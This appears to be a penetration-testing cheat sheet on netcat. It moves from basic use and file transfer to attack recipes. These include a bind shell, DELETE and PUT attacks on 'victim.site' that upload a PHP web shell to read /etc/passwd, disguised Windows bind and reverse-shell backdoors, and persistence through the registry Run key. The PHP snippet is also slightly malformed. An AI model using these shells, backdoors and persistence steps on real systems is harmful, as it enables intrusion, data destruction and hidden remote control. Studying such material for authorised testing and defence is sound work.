---
title: netcat
author: amandaguglieri
draft: false
TableOfContents: true
tag: http
---


## Installation

Preinstalled in kali. Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP.

For windows: [https://nmap.org/ncat/](https://nmap.org/ncat/).

For linux: 

```bash
sudo apt install ncat
```


## Usage

It’s used for HTTP

```bash
nc <IP> <port> -flags
```

### Fingerprinting with netcat

```bash
nc  <IP> 80
HEAD / HTTP/1.0     
# And hit RETURN twice
```

## Netcat commands


### As a server

```bash
nc -lvp 8888
#-p: specify a port
#-l: to listening
#-v: verbosity
#-u: enforces udp connection
#-e: executes the given command
```

### As a client

```bash
nc -v <ip> <port>
```


## Transfer data

On the server side:

```bash
#data will be printed on screen
nc -lvp <port>  
```

On the client side:

```bash
echo “hello” | nc -v <ip> <port>
```



## Transfer data and save it in a file

On the server side: 

```bash
# Data will be stored in reveived.txt file.
nc -lvp <port> > received.txt   
```

On the client side:

```bash
echo “hello” | nc -v <ip> <port>
```

## Transfer file and save it 

On the server side: 

```bash
# Received data will be stored in reveived.txt file.
nc -lvp <port> > received.txt   
```

On the client side:

```bash
cat tobesentfiel.txt | nc -v <ip> <port>
```

## Netcat shell

On the server side:

```bash
nc -lvp <port> -e /bin/bash
```

On the client side:

```bash
nc -v <ip> <port>
```


## Some enumeration techniques for HTTP verbs

```bash
# Send a OPTIONS message with netcat
nc victim.target 80
OPTIONS / HTTP/1.0

```



## Some exploitation techniques for HTTP verbs


### DELETE attack


```bash
# General syntax for removing a resource from server using netcat
nc victim.site 80
DELETE /path/to/resource.txt HTTP/1.0


# Example for removing the login page of a site
nc victim.site 80
DELETE /login.php HTTP/1.0

```

### PUT attack: getting a shell

```bash
# Save for instance a php basic shell in a file (shell.php):

<?php 
if (isset($_GET[‘cmd’]))
{
	$cmd = $_GET[‘cmd’];
	echo ‘<pre>’;
	$result = shell_exec($cmd);
	echo $result;
	echo ‘</pre>’;
?>


# Count the size of the file
wc -m shell.php

# Send with netcat the HTTP verb message
nc victim.site 80
PUT /shell.php HTTP/1.0
Conten-type: text/html
Content-length: [number you got with wc -m payload]
 

# Run the exploit by typing in the browser:
http://victim.site/shell.php?cmd=cat+/etc/passwd
```

## Backdoors

### The attacker initiates the connection

**In the victim machine**: If windows, get the ncat.exe executable file, rename it to something else such as winconfig and we write in command line:

```
wincofig -l -p <port> -e cmd.exe
# Example: wincofig -l -p 5555 -e cmd.exe
```

**In the attacker machine**:

```
ncat <victim IP address> <port specified>
# Example: ncat 192.168.0.40 5555
```

### The victim initiates the connection

Great to avoid firewalls!!!

**In the victim machine**: If windows, get the ncat.exe executable file, rename it to something else such as winconfig and we write in command line:

```
winconfig -e cmd.exe <attacker IP> <port>
# Example: winconfig -e cmd.exe 192.168.1.40 5555
```
**In the attacker machine**:

```
ncat -l -p <port> -v
# Example: ncat -l -p 5555 -v
```

### Creating a registry in regedit

- In regedit, go to Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
- Right-Button > New > String value
- We name it exactly like the ncat.exe file (if we renamed it to winconfig, then we call this registry winconfig>
- We edit the registry and we add the path to the executable file and some commands  in the Value data:

```
“C:\Windows/System32\winconfig.exe <attacker IP> <port> -e cmd.exe”
# For instance: “C:\Windows/System32\winconfig.exe 192.168.1.50 5540 -e cmd.exe”
```

